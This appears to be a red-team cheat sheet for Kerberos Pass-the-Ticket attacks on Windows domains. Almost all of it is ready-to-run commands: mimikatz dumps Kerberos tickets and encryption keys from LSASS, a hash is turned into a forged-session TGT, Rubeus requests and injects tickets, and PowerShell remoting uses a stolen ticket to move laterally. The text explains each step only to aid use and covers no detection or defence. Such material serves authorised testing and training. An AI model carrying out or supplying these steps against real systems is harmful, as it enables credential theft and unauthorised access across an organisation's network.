**Overview:**
- PtT abuses Kerberos authentication by injecting a stolen ticket into a session instead of using a password or hash. The ticket acts as proof of identity without requiring the account's credentials.
- Two ticket types can be used: a TGT (Ticket Granting Ticket) allows requesting any service ticket the account has access to. A TGS (Ticket Granting Service) grants access to a specific service only.
- On Windows, tickets are stored and processed by LSASS. Non-admin users can only retrieve their own tickets. Local admin access allows harvesting all tickets from the system.
- MITRE ATT&CK: T1550.003
---
## Ticket Harvesting

> Run on the Windows target.

```
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

Exports all Kerberos tickets from LSASS to `.kirbi` files in the current directory. Requires local admin.

---
## OverPass the Hash (Pass the Key)

OverPass the Hash converts a user's hash or AES key into a usable Kerberos TGT. Use it when you have a hash but need a Kerberos ticket instead of an NTLM-based session.
### Mimikatz

> Run on the Windows target.

```
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

Dumps all Kerberos encryption keys (RC4/AES128/AES256) for all sessions in LSASS.

```
mimikatz # sekurlsa::pth /domain:<domain> /user:<user> /ntlm:<NThash>
```

Spawns a new `cmd.exe` in the context of the target user with a forged TGT. From this window, service tickets can be requested for any resource the account can access.

### Rubeus

> Run on the Windows target.

```powershell
Rubeus.exe asktgt /domain:<domain> /user:<user> /aes256:<aes256key> /nowrap
```

Requests a TGT using the AES256 key. Also accepts `/rc4`, `/aes128`, or `/des`. `/nowrap` outputs the ticket as a single-line Base64 string for easy copy-paste.

---
## Pass the Ticket

Use `/ptt` to inject the ticket directly into the current session in one step. Use the `.kirbi` file or Base64 string when the ticket was exported from another system and needs to be imported manually.

> Run on the Windows target.

### Rubeus - Direct injection

```powershell
Rubeus.exe asktgt /domain:<domain> /user:<user> /rc4:<NThash> /ptt
```

Requests a TGT and injects it into the current logon session immediately. No `.kirbi` file is written to disk.

### Rubeus - Import from file

```powershell
Rubeus.exe ptt /ticket:<ticket>.kirbi
```

Imports a `.kirbi` ticket file into the current session.

### Rubeus - Import from Base64

```powershell
Rubeus.exe ptt /ticket:<base64string>
```

Imports a ticket provided as a Base64 string. Use this when you cannot transfer a file (e.g. copy-pasting over RDP or a reverse shell). The `.kirbi` file and its Base64 representation are the same ticket in different formats, both work identically with `ptt`.

### Convert .kirbi to Base64

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("<ticket>.kirbi"))
```

Converts a `.kirbi` file to Base64 for use with the string-based import method above.

### Mimikatz - Import from file

```
mimikatz # privilege::debug
mimikatz # kerberos::ptt "<path>\<ticket>.kirbi"
```

Imports a `.kirbi` ticket into the current session via Mimikatz.

---
## Lateral Movement with a Ticket

### PowerShell Remoting (Mimikatz)

> Run on the Windows target.

After importing the ticket with `kerberos::ptt`, open a new cmd.exe from the same session.

```powershell
Enter-PSSession -ComputerName <target>
```

Connects to the target using the injected ticket. The PSSession inherits the Kerberos context of the current session.

### PowerShell Remoting (Rubeus)

> Run on the Windows target.

```powershell
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

Creates an isolated sacrificial logon session (Logon Type 9) with a new cmd.exe. Equivalent to `runas /netonly`. Prevents existing TGTs in the current session from being overwritten.

```powershell
Rubeus.exe asktgt /user:<user> /domain:<domain> /aes256:<aes256key> /ptt
```

Requests a TGT and injects it into the sacrificial session. 

```powershell
Enter-PSSession -ComputerName <target>
```

From that cmd.exe window, connect to the target.